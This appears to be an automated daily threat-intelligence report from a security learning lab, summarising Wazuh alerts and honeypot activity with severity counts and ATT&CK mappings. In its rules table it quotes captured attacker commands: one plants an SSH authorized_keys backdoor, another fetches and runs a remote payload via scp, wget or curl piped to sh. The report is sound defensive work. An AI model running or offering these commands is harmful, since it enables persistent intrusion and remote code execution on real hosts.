# LearningLab01 Daily Threat Intelligence Report — 2026-10-14

Generated: 2026-10-14T13:15:05.052Z

Report window: 2026-10-13T13:15:05.028Z through 2026-10-14T13:15:05.028Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 321,742 |
| Attack-related alerts | 14,835 |
| Honeypot interactions | 304,503 |
| Authentication failures | 2,637 |
| Authentication successes | 489 |
| Critical alerts | 413 |
| High alerts | 1,790 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 413 critical-severity alerts require priority review.
- 1,790 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 5.39:1.
- Country attribution currently covers only 20.02% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (175,204 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 413 | 0.13% |
| High | 1,790 | 0.56% |
| Medium | 3,185 | 0.99% |
| Low | 316,354 | 98.33% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 2,637
- Authentication successes: 489
- Failure-to-success ratio: 5.39:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,351 | 63.03% |
| Payload delivery | 9,351 | 63.03% |
| Authentication failure | 2,637 | 17.78% |
| Command execution | 1,578 | 10.64% |
| Reconnaissance | 766 | 5.16% |
| Network scan | 291 | 1.96% |
| Malware | 126 | 0.85% |
| Web attack | 72 | 0.49% |
| SMTP attack | 13 | 0.09% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 64,415 alerts, representing 20.02% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 257,327 | 79.98% | Not geolocated |
| Bulgaria | 63,068 | 19.60% | ████████████████████ |
| Republic of Moldova | 609 | 0.19% | █ |
| Germany | 333 | 0.10% | █ |
| Romania | 168 | 0.05% | █ |
| United Kingdom | 144 | 0.04% | █ |
| United States | 85 | 0.03% | █ |
| Iran | 3 | 0.00% | █ |
| British Virgin Islands | 2 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| South Africa | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 41 |
| Execution | 19 |
| Impact | 13 |
| Command and Control | 3 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 41 |
| Command and Scripting Interpreter | 19 |
| Stored Data Manipulation | 13 |
| Ingress Tool Transfer | 3 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 175,204 | T-Pot RDP connection from [IP address] to port 3389. | tpot (175,204) |
| 110219 | 4 | 63,886 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - | tpot (63,886) |
| 110207 | 5 | 28,484 | T-Pot SentryPeer SIP activity from [IP address]:64126, method INVITE | tpot (28,484) |
| 110204 | 4 | 22,923 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (22,923) |
| 110205 | 6 | 9,297 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,297) |
| 110101 | 3 | 4,188 | Cowrie SSH connection from [IP address]. | tpot (4,188) |
| 23502 | 3 | 3,811 | The CVE-2012-4542 that affected linux-image-6.8.0-142-generic was solved due to an update in the agent or feed. | tpot (3,811) |
| 110201 | 4 | 3,510 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (3,510) |
| 110102 | 5 | 2,637 | Cowrie failed login from [IP address] using username ubuntu. | tpot (2,637) |
| 23508 | 3 | 1,604 | CVE-2012-4542 affects linux-image-6.8.0-147-generic (Missing information, CVE awaiting analysis) | tpot (1,604) |
| 110104 | 7 | 1,385 | Cowrie captured a command from [IP address]: zalee | tpot (1,385) |
| 23505 | 10 | 1,370 | CVE-2017-13165 affects linux-image-6.8.0-147-generic | tpot (1,370) |
| 23504 | 7 | 546 | CVE-2015-7837 affects linux-image-6.8.0-147-generic | tpot (546) |
| 110214 | 9 | 284 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (284) |
| 110222 | 9 | 270 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (270) |
| 23506 | 13 | 242 | CVE-2021-3773 affects linux-image-6.8.0-147-generic | tpot (242) |
| 533 | 7 | 239 | Listened ports status (netstat) changed (new port opened or closed). | tpot (239) |
| 110103 | 10 | 198 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (198) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110221 | 7 | 173 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (173) |
| 110109 | 13 | 171 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (171) |
| 5502 | 3 | 166 | PAM: Login session closed. | tpot (165), wazuh (1) |
| 110105 | 12 | 104 | Cowrie captured a file download from [IP address]. | tpot (104) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110209 | 5 | 95 | T-Pot Conpot IEC104 event from [IP address]: NEW_CONNECTION | tpot (95) |
| 110216 | 4 | 92 | T-Pot Mailoney received SMTP command from [IP address]: STARTTLS  | tpot (92) |
| 110220 | 8 | 88 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (88) |
| 110223 | 5 | 68 | T-Pot HoneyAML received GET request from [IP address] to /api/datasources on port 3000. | tpot (68) |
| 110212 | 10 | 54 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (54) |
| 23503 | 5 | 49 | CVE-2018-1121 affects linux-image-6.8.0-147-generic | tpot (49) |
| 110106 | 10 | 41 | Cowrie detected repeated failed logins from [IP address]. | tpot (41) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 2904 | 7 | 33 | Dpkg (Debian Package) half configured. | tpot (25), wazuh (8) |
| 110215 | 4 | 31 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (31) |
| 203 | 9 | 31 | Agent event queue is full. Events may be lost. | tpot (31) |
| 2902 | 7 | 25 | New dpkg (Debian Package) installed. | tpot (20), wazuh (5) |
| 110108 | 12 | 19 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (19) |
| 110208 | 7 | 18 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5067 | tpot (18) |
| 110217 | 7 | 13 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: MAIL FROM:<hello@info.com>  | tpot (13) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110211 | 9 | 7 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (7) |
| 2901 | 3 | 7 | New dpkg (Debian Package) requested to install. | tpot (7) |
| 2903 | 7 | 7 | Dpkg (Debian Package) removed. | tpot (7) |
| 110224 | 7 | 4 | T-Pot HoneyAML received an HTTP POST from [IP address] to /. | tpot (4) |
| 202 | 7 | 4 | Agent event queue is 90% full. | tpot (4) |
| 205 | 3 | 4 | Agent event queue is back to normal load. | tpot (4) |
| 110107 | 12 | 3 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (3) |
| 86003 | 3 | 3 | Docker: Error message | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 550 | 7 | 2 | Integrity checksum changed. | tpot (1), wazuh (1) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
